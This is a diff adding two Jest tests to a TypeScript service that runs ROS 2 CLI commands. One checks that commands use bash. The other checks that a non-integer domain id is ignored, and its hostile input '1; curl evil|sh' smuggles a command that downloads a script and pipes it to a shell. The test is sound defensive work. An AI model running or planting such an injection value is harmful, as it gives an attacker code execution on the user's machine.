@@ -227,6 +227,16 @@ describe('Ros2CliService exec-backed methods', () => {
       return calls[calls.length - 1]?.[1] as Record<string, unknown> | undefined;
     }
 
+    it('runs exec commands under bash so sourced setup.bash scripts work', async () => {
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+
+      // ROS setup.bash scripts use bash features (Bad substitution under
+      // dash), so hidden execs that source them must run under bash.
+      const options = lastExecOptions();
+      expect(options?.shell).toBe('/bin/bash');
+    });
+
     it('executes without a ROS_DOMAIN_ID env key when unset', async () => {
       cli.setDomainId(undefined);
       mockStdout('/talker\n');
@@ -269,6 +279,18 @@ describe('Ros2CliService exec-backed methods', () => {
 
       const options = (exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string | undefined> };
       expect(options.env.ROS_DOMAIN_ID).toBeUndefined();
+    });
+
+    it('ignores non-integer domain ids from settings', async () => {
+      // A hostile workspace configuration can set ramros.ros.domainId to a
+      // string; passing it verbatim into the shell would be injection.
+      const hostile = '1; curl evil|sh' as unknown as number;
+      cli.setDomainId(hostile);
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string | undefined> }).env;
+      expect(env?.ROS_DOMAIN_ID).toBeUndefined();
     });
 
     it('getActiveNodesForDomain uses the given domain regardless of the global default', async () => {
